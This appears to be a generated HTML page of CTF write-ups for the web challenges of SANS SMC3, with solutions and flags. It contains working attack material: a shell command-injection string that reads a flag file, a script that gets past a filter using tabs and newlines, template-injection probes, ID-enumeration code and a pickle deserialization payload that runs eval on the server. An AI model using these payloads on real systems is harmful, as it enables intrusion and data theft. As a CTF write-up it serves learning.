@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>CTF Writeups</title>
+
+      
+      
+
+      <!-- CSS -->
+      
+      <link rel="stylesheet" href="http://127.0.0.1:1111/style.css">
+      
+
+      
+      
+    </head>
+
+    <body>
+        <div class="menu">
+            
+            
+            <nav role="navigation">
+                <ul>
+                    
+                        
+                        
+                            
+                            <li >
+                                
+                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;auctf-2020&#x2F;">
+                                    
+                                    AUCTF 2020
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;auctf-2020&#x2F;reversing&#x2F;">
+                                                    
+                                                    Reversing
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;">
+                                    
+                                    SANS SMC3
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;binary&#x2F;">
+                                                    
+                                                    Binary
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;crypto&#x2F;">
+                                                    
+                                                    Crypto
+                                                </a>
+                                            </li>
+                                        
+                                            <li class="active">
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;web&#x2F;">
+                                                    
+                                                    Web
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;forensics&#x2F;">
+                                                    
+                                                    Forensics
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;network&#x2F;">
+                                                    
+                                                    Network
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                    
+                </ul>
+            </nav>
+            
+            
+        </div>
+
+        <div class="page">
+            <div class="page__header">
+                <div class="menu-icon">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                
+                <span class="search-icon">🔎</span>
+                
+            </div>
+
+            <div class="page__content">
+                
+                <div class="search-container">
+                    <input id="search" type="search" placeholder="Search..">
+                    <div class="search-results">
+                        <div class="search-results__header"></div>
+                        <ul class="search-results__items"></ul>
+                    </div>
+                </div>
+                
+                <div class="book-content">
+                    
+    <h1>Web</h1>
+    <h2 id="we01">we01<a class="zola-anchor" href="#we01" aria-label="Anchor link for: we01">🔗</a></h2>
+<p>https://ggcs-we01.allyourbases.co/</p>
+<p>the blurb said that the flag was on some common directory and said to look for a list of common directories.</p>
+<p>I tossed a dirbuster at it and found a valid directory at https://ggcs-we01.allyourbases.co/sample/</p>
+<p>the flag was at https://ggcs-we01.allyourbases.co/sample/flag.txt</p>
+<p>flag: <code>bustING_direTORies_8918</code></p>
+<h2 id="we02">we02<a class="zola-anchor" href="#we02" aria-label="Anchor link for: we02">🔗</a></h2>
+<p>https://ggcs-we02.allyourbases.co/</p>
+<p>the flag was hidden in one of the webpack js files - particularly https://ggcs-we02.allyourbases.co/component---src-pages-else-js-b41975d5a1f03391fee1.js</p>
+<p>I saw it in the source code and noticed that it didn't get loaded.  After checking it out manually i found the flag.</p>
+<p>flag: <code>webPACkEd-AlRiGHT_7182</code></p>
+<h2 id="we03">we03<a class="zola-anchor" href="#we03" aria-label="Anchor link for: we03">🔗</a></h2>
+<p>https://ggcs-we03.allyourbases.co/</p>
+<p>the blurb mentioned a secret page which made me think about robots.txt.  I checked it out and it had a disallow directive for https://ggcs-we03.allyourbases.co/61829201829023.html.  The flag was on that page. </p>
+<p>flag: <code>NO_CrAwLing_Plz_0192</code></p>
+<h2 id="we04">we04<a class="zola-anchor" href="#we04" aria-label="Anchor link for: we04">🔗</a></h2>
+<p>https://ggcs-we04.allyourbases.co/</p>
+<p>There was some javascript making a request and passing the user agent.  I assumed that the purpose was to allow search engines to read it for SEO purposes.  I set my user agent to googlebot (<code>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</code>) and it gave me the flag.<br />
+flag: <code>CrawlING-So-SlOwLY-8199</code></p>
+<h2 id="wm01">wm01<a class="zola-anchor" href="#wm01" aria-label="Anchor link for: wm01">🔗</a></h2>
+<p>https://ggcs-wm01.allyourbases.co/</p>
+<p>basic shell command injection.  The flag could be read with <code>/root; cat .flag.txt</code></p>
+<p>flag: <code>unSAFE_eXecution_42</code></p>
+<h2 id="wm02">wm02<a class="zola-anchor" href="#wm02" aria-label="Anchor link for: wm02">🔗</a></h2>
+<p>https://ggcs-wm02.allyourbases.co/index.html</p>
+<p>I looked at the source and found that if you had a cookie name <code>login</code> with and id set but nothing else it would fill out the rest of the data.  I wrote a python script to incrementally try every number until 100.  The admin was id 33.</p>
+<pre style="background-color:#272822;">
+<code><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">requests
+</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">json
+url </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm02&quot;
+</span><span style="color:#f92672;">for </span><span style="color:#f8f8f2;">i </span><span style="color:#f92672;">in </span><span style="color:#66d9ef;">range</span><span style="color:#f8f8f2;">(</span><span style="color:#ae81ff;">100</span><span style="color:#f8f8f2;">):
+	r </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">requests.post(url, </span><span style="font-style:italic;color:#fd971f;">data </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">json.dumps({</span><span style="color:#e6db74;">&quot;id&quot;</span><span style="color:#f8f8f2;">: i}))
+	</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(r.text)
+</span></code></pre>
+<p>flag: <code>IncREMentaLl_SessIoNs-1920</code></p>
+<h2 id="wm03">wm03<a class="zola-anchor" href="#wm03" aria-label="Anchor link for: wm03">🔗</a></h2>
+<p>https://ggcs-wm03.allyourbases.co/</p>
+<p>I tried a couple other user IDs with getUser but that didn't pan out.  I then tried to send a command to list users and it responsed with a list of commands</p>
+<pre style="background-color:#272822;">
+<code><span style="color:#f8f8f2;">        </span><span style="color:#e6db74;">&quot;commands&quot;</span><span style="color:#f8f8f2;">: [
+            </span><span style="color:#e6db74;">&quot;getUser&quot;</span><span style="color:#f8f8f2;">,
+            </span><span style="color:#e6db74;">&quot;setUser&quot;</span><span style="color:#f8f8f2;">,
+            </span><span style="color:#e6db74;">&quot;getFlag&quot;</span><span style="color:#f8f8f2;">,
+            </span><span style="color:#e6db74;">&quot;config&quot;
+        </span><span style="color:#f8f8f2;">]
+</span></code></pre>
+<p>I tried getFlag but it required an authentication token.  POSTing config responded with the token and then I was able to retrieve the flag. </p>
+<p>flag: <code>LAx_AUThEntiCaTION-:(</code></p>
+<h2 id="wh01">wh01<a class="zola-anchor" href="#wh01" aria-label="Anchor link for: wh01">🔗</a></h2>
+<p>you can do command injection with <code>\n</code> and <code>\t</code> to bypass the blocked characters.  the flag is at /var/task/.../.flag.txt.  I hate this so much, i missed it the first time around and had to brute force every file on the system to find it.</p>
+<p>i used this script to make operation of it a little easier.</p>
+<pre style="background-color:#272822;">
+<code><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">json
+</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">requests
+
+url </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wh01&quot;
+
+</span><span style="color:#f92672;">while </span><span style="color:#ae81ff;">True</span><span style="color:#f8f8f2;">:
+	base_cmd </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;/root</span><span style="color:#ae81ff;">\\</span><span style="color:#e6db74;">n&quot;
+	</span><span style="color:#f8f8f2;">cmd </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">base_cmd </span><span style="color:#f92672;">+ </span><span style="color:#66d9ef;">input</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;&gt; &quot;</span><span style="color:#f8f8f2;">)
+	</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(cmd)
+	cmd </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">cmd.replace(</span><span style="color:#e6db74;">&quot; &quot;</span><span style="color:#f8f8f2;">,</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">\\</span><span style="color:#e6db74;">t&quot;</span><span style="color:#f8f8f2;">)
+	path </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">f</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">{{\&quot;</span><span style="color:#e6db74;">path</span><span style="color:#ae81ff;">\&quot;</span><span style="color:#e6db74;">: </span><span style="color:#ae81ff;">\&quot;</span><span style="color:#f8f8f2;">{cmd}</span><span style="color:#ae81ff;">\&quot;}}</span><span style="color:#e6db74;">&quot;
+	</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;path: &quot;</span><span style="color:#f8f8f2;">, path)
+	</span><span style="color:#75715e;"># path = path.format()
+	</span><span style="color:#f8f8f2;">r </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">requests.post(url, </span><span style="font-style:italic;color:#fd971f;">data </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">path)
+	</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(r.json()[</span><span style="color:#e6db74;">&#39;body&#39;</span><span style="color:#f8f8f2;">])
+</span></code></pre>
+<p>flag: <code>SCUffeD_FiLTERing_1000</code></p>
+<h2 id="wh02">wh02<a class="zola-anchor" href="#wh02" aria-label="Anchor link for: wh02">🔗</a></h2>
+<p>I noticed that whenever displaying a 404 the page would show the path i failed to access.  I played around with it for a while trying out different injections until I noticed that <code>{{7 * 7}}</code> evaluated.  I then tried <code>{{ locals() }}</code> and received</p>
+<pre style="background-color:#272822;">
+<code><span style="color:#f8f8f2;">It appears you got lost on the way to: /{&#39;_Context__self&#39;: , &#39;dict&#39;: , &#39;lipsum&#39;: , &#39;cycler&#39;: , &#39;joiner&#39;: , &#39;namespace&#39;: , &#39;dir&#39;: , &#39;help&#39;: Type help() for interactive help, or help(object) for help about object., &#39;locals&#39;: , &#39;globals&#39;: , &#39;laksnd8quoqjknadaklsd9aodu892ja&#39;: &#39;Flag: tEmPlATes-R-FuNN-2391&#39;} of None&gt;, &#39;_Context__obj&#39;: , &#39;args&#39;: (), &#39;kwargs&#39;: {}, &#39;__traceback_hide__&#39;: True, &#39;fn&#39;: , &#39;fn_type&#39;: &#39;environmentfunction&#39;}`
+</span></code></pre>
+<p>flag: <code>tEmPlATes-R-FuNN-2391</code></p>
+<h2 id="wh03">wh03<a class="zola-anchor" href="#wh03" aria-label="Anchor link for: wh03">🔗</a></h2>
+<p>https://ggcs-wh03.allyourbases.co/</p>
+<p>the website has a bunch of gross javascript and if it takes you more than 100 ms to skip the breakpoint it'll reload.  to bypass this I turned off javascript and then executed the relevant code manually.  I searched around the code until i saw something that looked like it printed the flag (the function u).  It required x to be equal to seq for it to print the flag so i cracked open the js console and set it manually, then called u().</p>
+<p>flag: <code>rANDom_VICTORy_113</code></p>
+<h2 id="wx01">wx01<a class="zola-anchor" href="#wx01" aria-label="Anchor link for: wx01">🔗</a></h2>
+<p>https://ggcs-wx01.allyourbases.co/</p>
+<p>python pickle deserialization exploit.  After noticing it was a pickle vuln from the stack trace i got when passing it a malformed data cookie, I wrote up a vuln to print the flag.  The flag was stored in a local variable so my exploit takes advantage of eval to execute code in the context of the server.</p>
+<pre style="background-color:#272822;">
+<code><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">pickle
+</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">codecs
+</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">base64
+</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">os
+</span><span style="font-style:italic;color:#f92672;">class </span><span style="text-decoration:underline;color:#a6e22e;">RCE</span><span style="color:#f8f8f2;">:
+    </span><span style="font-style:italic;color:#f92672;">def </span><span style="color:#66d9ef;">__reduce__</span><span style="color:#f8f8f2;">(</span><span style="font-style:italic;color:#fd971f;">self</span><span style="color:#f8f8f2;">):
+        </span><span style="color:#f92672;">return </span><span style="color:#66d9ef;">eval</span><span style="color:#f8f8f2;">, (</span><span style="color:#e6db74;">&quot;{&#39;name&#39;: flag}&quot;</span><span style="color:#f8f8f2;">,)
+
+
+</span><span style="color:#f92672;">if </span><span style="color:#f8f8f2;">__name__ </span><span style="color:#f92672;">== </span><span style="color:#e6db74;">&#39;__main__&#39;</span><span style="color:#f8f8f2;">:
+    pickled </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">pickle.dumps(RCE(), </span><span style="font-style:italic;color:#fd971f;">protocol</span><span style="color:#f92672;">=</span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">)
+    </span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(base64.urlsafe_b64encode(pickled))
+
+</span></code></pre>
+<p>flag: <code>suPER_SeRiAL-bR0_02891</code></p>
+
+
+                </div>
+            </div>
+
+            <div class="prev-link">
+                
+    
+        <a class="previous" href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;crypto&#x2F;"><</a>
+    
+
+            </div>
+
+            <div class="next-link">
+                
+    
+        <a class="next" href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;forensics&#x2F;">></a>
+    
+
+            </div>
+        </div>
+
+        
+            
+            <script type="text/javascript" src="http://127.0.0.1:1111/elasticlunr.min.js"></script>
+            <script type="text/javascript" src="http://127.0.0.1:1111/search_index.en.js"></script>
+            
+            <script type="text/javascript" src="http://127.0.0.1:1111/book.js"></script>
+        
+    <script src="/livereload.js?port=1024&amp;mindelay=10"></script></body>
+
+</html>
